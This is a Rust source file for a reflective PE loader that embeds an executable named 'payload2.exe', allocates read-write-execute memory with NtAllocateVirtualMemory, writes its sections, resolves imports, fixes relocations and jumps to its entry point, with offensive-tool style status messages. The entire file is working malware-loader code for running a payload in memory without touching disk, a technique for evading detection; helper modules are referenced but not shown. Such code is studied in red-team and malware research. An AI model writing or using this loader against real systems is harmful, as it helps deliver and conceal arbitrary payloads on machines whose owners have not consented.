#![no_std]

pub mod iat;
pub mod pe;
pub mod ntapi;

use core::{ffi::c_void, mem};

use print_no_std::println;
use windows::{
    Wdk::Storage::FileSystem::NtAllocateVirtualMemory,
    Win32::{
        Foundation::STATUS_SUCCESS,
        System::{Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE}, Threading::GetCurrentProcess},
    },
};

extern crate alloc;

fn main() {
    let payload_bytes = include_bytes!("payload2.exe");

    let dos_header = pe::get_dos_header(payload_bytes);
    let nt_header = pe::get_nt_header(payload_bytes);

    let image_size = pe::get_image_size(payload_bytes);

    println!("[*] Allocating memory for payload");
    let baseptr = allocate_memory(image_size);

    println!();
    println!("[*] Writing sections to memory");
    pe::write_sections(payload_bytes, baseptr, &nt_header, &dos_header);

    println!();
    println!("[*] Writing import address table");
    iat::resolve_imports(baseptr, &nt_header);

    println!();
    println!("[*] Fixing relocations");
    pe::fix_relocations(baseptr, &nt_header);

    println!();
    println!("[*] Executing payload");

    let entrypoint = nt_header.OptionalHeader.AddressOfEntryPoint;
    unsafe {
        let entrypoint_func: extern "C" fn() =
            mem::transmute(baseptr.add(entrypoint as usize));
        entrypoint_func();
    }
    println!("[*] Payload executed");
}

fn allocate_memory(size: usize) -> *mut c_void {
    unsafe {
        println!("Allocating {} bytes", size);
        let mut baseptr: *mut c_void = core::ptr::null_mut();
        let mut region_size: usize = size;
        let status = NtAllocateVirtualMemory(
            GetCurrentProcess(),
            &mut baseptr,
            0,
            &mut region_size,
            MEM_COMMIT.0,
            PAGE_EXECUTE_READWRITE.0,
        );

        if status != STATUS_SUCCESS {
            panic!(
                "NtAllocateVirtualMemory failed. NTSTATUS: {:#X} (Value: {})",
                status.0, status.0 
            );
        }
        println!("NtAllocateVirtualMemory succeeded. Base address: {:?}", baseptr);
        baseptr
    }
}
